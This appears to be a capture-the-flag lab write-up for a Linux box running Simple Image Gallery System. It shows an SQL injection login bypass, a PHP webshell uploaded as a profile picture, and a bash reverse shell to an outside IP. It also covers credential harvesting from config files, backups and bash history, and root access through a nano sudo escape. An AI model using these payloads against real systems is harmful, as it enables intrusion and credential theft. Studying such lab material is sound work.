# gallery666

**Status:** Completed
**Target:** `$TARGET`
**OS:** Linux
**Difficulty:** Easy

## Recon 

```bash
# What it does: execute a full TCP port scan using a fast SYN approach.
# Why here: map the open ports on the target.
nmap -sS -p- -n -Pn --min-rate 5000 --open $TARGET -oN silent

# What it does: perform service version detection and default script scanning on discovered ports.
# Why here: identify the versions of SSH and Apache running on the host.
nmap -sVC -p22,80,8080 $TARGET -oN service
```

**Output**
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

## Enumeration

Accessing port `8080` reveals a login panel for the product "Simple Image Gallery System".

### Login SQL Injection Bypass

The login panel is vulnerable to SQL injection.

#### Step 1: Login bypass
```bash
# What it does: send a POST request with an SQL injection payload in the username field.
# Why here: bypass authentication and log in as the admin user.
curl -X POST http://$TARGET:8080/classes/Login.php?f=login \
  -d "username=admin' or '1'='1'#" \
  -d "password=" \
  -c cookies.txt
```

#### Step 2: Obtain user data
```bash
# What it does: fetch the user profile page using the authenticated session cookie.
# Why here: extract required fields ('id', 'firstname', 'lastname', 'username') needed to submit the profile update form later.
curl -X GET http://$TARGET:8080/page=user \
  -b cookies.txt \
  -o user_page.html
```

#### Step 3: Create the webshell
```bash
# What it does: create a simple PHP webshell that executes system commands via the 'cmd' GET parameter.
# Why here: prepare the payload to be uploaded as a profile picture.
cat > shell.php << 'EOF'
<php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } >
EOF
```

#### Step 4: Upload the shell as a profile picture
```bash
# What it does: submit the user profile update form with the PHP webshell attached as the 'img' parameter.
# Why here: exploit the unrestricted file upload vulnerability to drop the webshell into the webroot.
curl -X POST http://$TARGET/gallery/classes/Users.php?f=save \
  -b cookies.txt \
  -F "id=1" \
  -F "firstname=Adminstrator" \
  -F "lastname=Admin" \
  -F "username=admin" \
  -F "password=" \
  -F "img=@shell.php"
```

#### Step 5: Execute commands
```bash
# What it does: trigger the uploaded webshell and execute the 'whoami' command.
# Why here: verify remote code execution on the target.
curl "http://$TARGET/gallery/uploads/1779208500_shell.php?cmd=whoami"
```

### Reverse Shell
```bash
# What it does: URL-encode and execute a bash reverse shell one-liner via the webshell.
# Why here: establish an interactive session on the target.
curl "http://$TARGET/gallery/uploads/1779208500_shell.php?cmd=$(echo '/bin/bash -c "bash -i >& /dev/tcp/192.168.160.214/8080 0>&1"' | jq -sRr @uri)"
```

Stabilize the shell:
```bash
# What it does: spawn a fully interactive PTY using Python.
# Why here: stabilize the raw netcat reverse shell to allow job control and prevent accidental exits.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

## Linux Enumeration

```bash
# What it does: read the application initialization script.
# Why here: search for hardcoded database credentials or developer configurations.
cat initialize.php
```

**Output**
```php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
```

### Discovered Credentials

**Database:**
- Username: `gallery_user`
- Password: `passw0rd321`
- DB Name: `gallery_db`

**Developer User:**
- Username: `dev_oretnom`
- Password hash: `5da283a2d990e8d8512cf967df5bc0d0` (MD5)

#### Attempting to crack the hash
```bash
# What it does: attempt to crack the developer MD5 hash using hashcat and rockyou.
# Why here: try to recover the plaintext password for lateral movement or privilege escalation.
echo "5da283a2d990e8d8512cf967df5bc0d0" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
*Note: The hash could not be cracked.*

### Database Enumeration
```bash
# What it does: connect to the local MySQL database and query the users table.
# Why here: check if the database contains any other valid administrator hashes or plain text passwords.
mysql -u gallery_user -ppassw0rd321 -D gallery_db
SHOW TABLES;
SELECT * FROM users;
```

**Output**
```text
+----------------------+                                                                    
| Tables_in_gallery_db |                                                                    
+----------------------+                                                                    
| album_list           |                                                                    
| images               |                                                                    
| system_info          |                                                                    
| users                |                                                                    
+----------------------+  
----------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1779208500_shell.php | NULL       |    1 | 2021-01-20 14:02:37 | 2026-05-19 16:35:23 |
+----+--------------+----------+----------+----------------------------------+--------------
```

### System Enumeration for Alternative Credentials
```bash
# What it does: search the filesystem for text files containing sensitive keywords like 'password' or 'secret'.
# Why here: locate leaked passwords since the database hashes could not be cracked.
printenv
cat /etc/crontab
find / -name "*.txt" 2>/dev/null | xargs grep -l "password\|pass\|user\|key\|secret" 2>/dev/null
```

**Output**
```text
/var/backups/mike_home_backup/documents/accounts.txt
```

```bash
# What it does: read the discovered accounts backup file.
# Why here: extract plaintext credentials belonging to the user mike.
cat /var/backups/mike_home_backup/documents/accounts.txt
```

**Output**
```text
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

None of these passwords work for SSH. Checking the backup's bash history:

```bash
# What it does: read the user's bash history from the backup folder.
# Why here: find evidence of commands that might contain plaintext passwords or highlight administrative actions.
cd /var/backups/mike_home_backup/
cat .bash_history
```

**Output**
```bash
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -l b3stpassw0rdbr0xx
clear
sudo -l
exit
```

Recovered password for `mike`: `b3stpassw0rdbr0xx`. Switch user and enumerate privileges.

```bash
# What it does: check the sudo privileges for the current user.
# Why here: identify binaries or scripts that the user can execute as root.
sudo -l
cat /opt/rootkit.sh
```

**Output**
```bash
(root) NOPASSWD: /bin/bash /opt/rootkit.sh

#!/bin/bash
read -e -p "Would you like to versioncheck, update, list or read the report  " ans;
# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

## Privilege Escalation

The script executes `/bin/nano` as root when the `read` option is chosen. We can escape from nano into a root shell.

```bash
# What it does: run the privileged script, choose the 'read' option to open nano, and use GTFOBins nano escape to spawn a root shell.
# Why here: exploit the insecure sudo configuration to escalate privileges to root.
sudo /bin/bash /opt/rootkit.sh
read
# Inside nano: press Ctrl+R, then Ctrl+X
reset; sh 1>&0 2>&0
id
cat /root/root.txt
cat /home/mike/user.txt
```

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [curl](../../../tools/web/curl.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [python-pty.md](../../../payloads/shell-stabilization/python-pty.md)